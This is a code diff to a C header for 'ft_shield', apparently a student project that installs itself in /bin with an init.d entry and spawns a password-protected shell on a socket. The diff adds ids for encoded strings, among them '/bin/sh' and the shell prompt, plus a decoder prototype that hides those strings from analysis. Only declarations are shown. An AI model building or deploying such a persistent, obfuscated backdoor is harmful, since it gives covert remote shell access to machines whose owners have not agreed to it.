@@ -35,6 +35,21 @@
 #define SALT_LEN	16
 #define HASH_LEN	32
 
+/* encoded string ids (see strenc.c); STRENC_MAX = longest plaintext length */
+#define STRENC_MAX	33
+#define STR_KEYCODE	0
+#define STR_PROMPT	1
+#define STR_NL		2
+#define STR_Q		3
+#define STR_SHELL	4
+#define STR_EXIT	5
+#define STR_HELP_Q	6
+#define STR_HELP_SH	7
+#define STR_HELP_EXIT	8
+#define STR_SPAWNING	9
+#define STR_BINSH	10
+#define STR_SH		11
+
 #define INSTALL_PATH	"/bin/ft_shield"
 #define TMP_PATH	"/bin/.ft_shield.tmp"
 #define INIT_PATH	"/etc/init.d/ft_shield"
@@ -101,6 +116,9 @@ void	spawn_shell(int fd);
 void	sha256_init(t_sha256 *ctx);
 void	sha256_update(t_sha256 *ctx, const void *data, size_t len);
 void	sha256_final(t_sha256 *ctx, unsigned char out[HASH_LEN]);
+
+/* strenc */
+char	*str_dec(int id, char *out);
 
 /* utils */
 ssize_t	send_str(int fd, const char *s);
